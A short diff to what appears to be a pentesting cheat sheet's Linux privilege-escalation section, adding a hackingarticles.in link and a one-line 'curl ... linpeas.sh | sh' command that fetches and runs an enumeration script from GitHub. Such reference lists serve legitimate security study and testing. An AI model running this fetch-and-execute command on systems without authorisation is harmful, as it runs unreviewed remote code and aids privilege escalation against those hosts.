@@ -1128,6 +1128,7 @@
   - [hacktricks - linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
   - [swisskyrepo - privilege_escalation_Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
   - [lucyoa - kernel-exploits](https://github.com/lucyoa/kernel-exploits)
+  - [Linux Privilege Escalation: Automated Script](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/)
 
 - Attacks
   - Enumeration scripts
@@ -1136,6 +1137,7 @@
     - `bash linpeas.sh`
     - `python linuxprivchecker.py`
     - `./unix-privesc-check standard`
+    - `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`
 
 - Vulnerability scan
   - `perl les2.pl`
